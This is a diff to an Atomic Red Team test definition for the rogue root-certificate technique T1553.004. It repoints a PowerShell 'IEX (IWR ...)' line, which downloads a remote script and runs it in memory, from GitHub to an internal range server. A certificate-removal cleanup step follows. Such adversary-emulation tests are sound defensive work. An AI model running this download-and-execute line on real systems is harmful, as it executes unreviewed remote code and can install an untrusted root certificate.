@@ -188,7 +188,7 @@ atomic_tests:
   - windows
   executor:
     command: |
-      IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) 
+      IEX (IWR 'https://rangegogs.cnd.ca.gov/Range/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) 
     cleanup_command: |
       Get-ChildItem -Path Cert:\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item 
     name: powershell
